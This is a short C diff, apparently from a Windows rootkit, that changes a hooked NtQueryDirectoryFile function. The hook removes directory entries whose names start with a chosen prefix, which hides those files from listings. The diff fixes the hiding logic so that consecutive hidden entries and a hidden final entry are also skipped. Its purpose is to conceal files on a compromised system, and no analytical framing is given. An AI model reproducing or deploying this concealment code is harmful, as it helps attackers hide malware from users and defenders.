@@ -66,18 +66,23 @@ __kernel_entry NTSTATUS NTAPI OverrideNtQueryDirectoryFile(
 		FileName,
 		RestartScan
 	);
-	// TODO
-	// fix extraction logic, in cases when two or more sequential nodes need to be hidden
 
 	if (FileInformationClass == ClassFileIdBothDirectoryInformation && ReturnSingleEntry == FALSE)
 	{
 		PFILE_ID_BOTH_DIR_INFORMATION filelinkedlist = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
+
+		// First and second files are "." and ".."
+
 		while (filelinkedlist->NextEntryOffset != 0)
 		{
-			if (wcsncmp(GetNextNode(filelinkedlist)->FileName, WILDCARD, WILDCARDLEN) == 0)
+			while (wcsncmp(GetNextNode(filelinkedlist)->FileName, WILDCARD, WILDCARDLEN) == 0)
 			{
 				// remove the WILDCARD node(s)
-				filelinkedlist->NextEntryOffset += GetNextNode(filelinkedlist)->NextEntryOffset;
+
+				if (GetNextNode(filelinkedlist)->NextEntryOffset == 0)
+					filelinkedlist->NextEntryOffset = 0; // Last node
+				else
+					filelinkedlist->NextEntryOffset += GetNextNode(filelinkedlist)->NextEntryOffset;
 			}
 
 			if (filelinkedlist->NextEntryOffset != 0)
